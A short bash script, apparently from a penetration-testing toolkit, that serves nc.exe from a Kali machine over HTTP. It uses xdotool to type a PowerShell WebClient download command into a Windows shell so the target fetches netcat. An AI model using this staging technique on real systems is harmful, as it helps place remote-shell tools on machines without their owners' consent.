#!/bin/bash

: '
ps: nc file to server
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Http port"

HTTP_PORT=${form_data["Http port"]}

cd ~/Desktop/base/code/xdotool/scripts/fileTransfer/windows/.binaries
python3 -m http.server ${HTTP_PORT} &
HTTP_PID=$!

paste_command "(New-Object Net.WebClient).DownloadFileAsync('http://${KALI_IP}:${HTTP_PORT}/nc.exe','nc.exe')"
xdotool key Return
sleep 60

kill $HTTP_PID